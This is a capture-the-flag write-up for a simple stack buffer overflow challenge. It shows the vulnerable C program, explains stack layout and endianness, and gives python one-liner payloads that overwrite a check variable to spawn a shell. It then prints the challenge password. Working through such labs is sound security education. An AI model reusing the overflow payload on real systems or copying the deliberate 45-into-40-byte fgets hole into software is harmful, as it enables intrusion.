---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 1
---

## Source code
```c
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>

int main()
{

  int var;
  int check = 0x04030201;
  char buf[40];

  fgets(buf,45,stdin);

  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);

  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");

  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```
The program first sets up a `check` variable with the value `0x04030201`.
The program then sets up a buffer of 40 bytes.
It then uses the `fgets` to take user input.
## fgets()
```c
char *fgets(char *s, int size, FILE *stream);
```
As we can see it takes 3 arguments.
	- The first argument is the location where the input is supposed to be read to which is the buffer in our case.
	- The second argument is the maximum number of bytes to be read being 45.
	- The third argument is where the data us read from which is the STDIN in our case.

Lastly it has two conditional statements:
	- The first conditional executes if we replace the original value of the `check` variable with anything other than `0xdeadbeef`.
	- The second conditional executes if we replace the original value of the `check` variable with `0xdeadbeef`.

Let's provide 40 `a` and 4 `b` characters as input.
```
$ python -c 'print "a"*40 + "b"*4' | ./ch13

[buf]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[check] 0x62626262

You are on the right way!
```
We can see that `check` was set to `bbbb` which is `0x62626262` in hexadecimal which caused first conditional statement to be executed.
## Stack
```
+---------------+ 
|  61 61 61 61  | <====== buffer (40 bytes)
|  61 61 61 61  | 
|  61 61 61 61  |
|  61 61 61 61  |
|  61 61 61 61  |
|  61 61 61 61  |
|  61 61 61 61  |
|  61 61 61 61  |
|  61 61 61 61  |
|  61 61 61 61  |
+---------------+
|  62 62 62 62  | <====== check
+---------------+
```
We want to set the `check` variable to `0xdeadbeef`. However before we do that we need to understand the concept of endianness.
## Big endianness
```
+--------+--------+--------+--------+
| 0x1337 | 0x1338 | 0x1339 | 0x1340 |
+--------+--------+--------+--------+
|   de   |   ad   |   be   |   ef   |
+--------+--------+--------+--------+
```
The LSB is stored in the high memory address (`0x1340`) while the MSB is stored in the low memory address (`0x1337`).

This is the format in which humans write numbers.
## Little endianness
```
+--------+--------+--------+--------+
| 0x1337 | 0x1338 | 0x1339 | 0x1340 |
+--------+--------+--------+--------+
|   ef   |   be   |   ad   |   de   |
+--------+--------+--------+--------+
```
The LSB is stored in the low memory address (`0x1337`) while the MSB is stored in the high memory address (`0x1340`).

This is the format in which machines store data. This is the relevant format for our level.

Now we are ready to craft our exploit.
## Exploit
```
$ python -c 'print "a"*40 + "\xef\xbe\xad\xde"' | ./ch13

[buf]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭ�
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
Shell closed! Bye.
```
So the shell is closing immediately. In order to complete the exploit we need the shell to stay open.

We can use the `cat` command to keep the shell open.
```
$ (python -c 'print "a"*40 + "\xef\xbe\xad\xde"' ; cat) | ./ch13

[buf]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭ�
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
```
We know that the password is in the `HOME/.passwd` file. All we have to do now is to `cat` it.
```
cat .passwd
1w4ntm0r3pr0np1s
```
## Password
```
1w4ntm0r3pr0np1s
```
